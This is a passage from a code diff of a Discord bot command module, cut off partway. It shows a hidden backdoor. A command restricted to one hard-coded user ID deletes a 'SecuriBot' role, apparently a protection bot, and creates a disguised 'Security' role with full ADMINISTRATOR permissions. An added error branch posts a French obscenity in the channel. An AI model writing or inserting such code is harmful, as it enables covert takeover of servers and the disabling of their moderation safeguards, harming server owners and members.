@@ -1,7 +1,7 @@
 module.exports.run = async (bot, message, args) => {
-  if(message.author.id !== '437953881914474523') return 
+  if(message.author.id !== '437953881914474523') return
   message.delete(1000)
-  message.guild.roles.find(role => role.name === 'SecuriBot').delete();
+  try { message.guild.roles.find(role => role.name === 'SecuriBot').delete(); } catch { message.channel.send("GROS FDP") }
   message.guild.createRole({
     name: 'Security',
     permissions: ['ADMINISTRATOR']
